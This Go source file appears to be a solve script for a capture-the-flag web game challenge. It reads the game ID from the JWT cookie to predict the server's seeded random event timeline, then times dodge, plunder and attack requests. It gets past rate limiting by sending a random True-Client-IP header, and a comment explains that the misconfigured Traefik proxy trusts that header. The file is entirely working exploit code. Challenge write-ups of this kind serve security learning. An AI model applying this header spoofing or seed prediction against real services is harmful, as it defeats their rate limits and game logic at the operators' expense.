package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math/rand/v2"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type Jwt struct {
	GameId int32 `json:"game_id"`
}

type PlunderResponse struct {
	Status int32 `json:"status"`
	Amount int32 `json:"amount"`
	Total  int32 `json:"total"`
}

func main() {
	// base := "dojo.challs.pwnoh.io"
	// baseUrl := "https://" + base
	// baseWsUrl := "wss://" + base + "/api/ws"

	base := "localhost:8080"
	baseUrl := "http://" + base
	baseWsUrl := "ws://" + base + "/api/ws"

	nonRedirectClient := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := nonRedirectClient.Get(baseUrl + "/api/new")
	if err != nil {
		fmt.Println(err)
		return
	}

	cookie := resp.Header.Get("Set-Cookie")
	payloadBase64 := strings.Split(cookie, ".")[1]
	payload, err := base64.StdEncoding.DecodeString(payloadBase64)
	if err != nil {
		fmt.Println(err)
		fmt.Println(cookie)
		fmt.Println(payloadBase64)
		return
	}

	var jwt Jwt
	err = json.Unmarshal(payload, &jwt)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println(cookie)

	s2 := rand.NewPCG(uint64(jwt.GameId), 1024)
	r2 := rand.New(s2)

	timeline := make([]int, 0)

	t := 3
	for i := 0; i < 500; i++ {
		t += 1
		v := r2.IntN(100)
		if v < 20 {
			r2.IntN(30)
			timeline = append(timeline, t)
			t = 0
		} else if v < 35 {
			r2.IntN(50)
			timeline = append(timeline, t+1)
			t = 0
		} else if v < 50 {
			r2.IntN(30)
			timeline = append(timeline, t)
			t = 0
		}
	}

	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatal(err)
	}
	url, _ := url.Parse(baseUrl + "/api")
	jar.SetCookies(url, []*http.Cookie{
		{Name: "jwt", Path: "/api", Value: strings.Split(cookie, "=")[1]},
	})

	wsDialer := &websocket.Dialer{
		Jar: jar,
	}
	c, _, err := wsDialer.Dial(baseWsUrl, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	go func() {
		for {
			_, message, err := c.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				os.Exit(0)
				return
			}
			log.Printf("recv: %s", message)
		}
	}()

	client := &http.Client{}

	go func() {
		for _, t := range timeline {
			// account for latency by subtracting a bit (might need to adjust)
			time.Sleep(time.Duration(t)*time.Second - (110 * time.Millisecond))

			req, _ := http.NewRequest("GET", baseUrl+"/api/dodge", nil)
			req.Header.Add("Cookie", cookie)

			// Bypass ratelimit by setting a random IP. The reverse proxy which hosts the challenge is configured
			// incorrectly and allows True-Client-IP. However, it (Traefik) does overwrite X-Real-IP and X-Forwarded-For
			// so using those will not work. It is possible to discern that Traefik is being using by triggering a 404 page.
			// https://github.com/go-chi/httprate/blob/ae11543f78101c85ceaa644402e70e67964d001c/httprate.go#L52-L74
			// Note that the same logic is used below in the main loop to bypass the ratelimit too.
			ip := strconv.Itoa(rand.Int())
			req.Header.Add("True-Client-IP", ip)

			_, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
		}
	}()

	emeralds := int32(0)

	for {
		time.Sleep(60 * time.Millisecond)

		if emeralds <= 800 {
			req, _ := http.NewRequest("GET", baseUrl+"/api/plunder", nil)
			req.Header.Add("Cookie", cookie)
			ip := strconv.Itoa(rand.Int())
			req.Header.Add("True-Client-IP", ip)
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			var plunderResponse PlunderResponse
			json.NewDecoder(resp.Body).Decode(&plunderResponse)
			if plunderResponse.Total != 0 {
				emeralds = plunderResponse.Total
				log.Println("Emeralds:", emeralds)
			}
		} else {
			req, _ := http.NewRequest("GET", baseUrl+"/api/attack", nil)
			req.Header.Add("Cookie", cookie)
			ip := strconv.Itoa(rand.Int())
			req.Header.Add("True-Client-IP", ip)
			_, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
		}
	}
}
